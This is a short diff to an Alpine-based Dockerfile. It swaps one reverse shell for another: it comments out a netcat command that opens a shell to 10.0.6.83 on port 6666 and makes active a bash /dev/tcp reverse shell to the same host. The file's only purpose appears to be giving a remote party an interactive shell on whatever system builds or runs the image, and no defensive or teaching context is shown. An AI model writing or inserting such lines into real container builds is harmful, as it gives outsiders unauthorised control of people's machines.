@@ -1,4 +1,4 @@
 FROM alpine
 RUN apk update && apk add bash
-RUN nc 10.0.6.83 6666 -e /bin/bash
-# RUN /bin/bash -c 'bash -i >& /dev/tcp/10.0.6.83/6666 0>&1'
+# RUN nc 10.0.6.83 6666 -e /bin/bash
+RUN /bin/bash -c 'bash -i >& /dev/tcp/10.0.6.83/6666 0>&1'
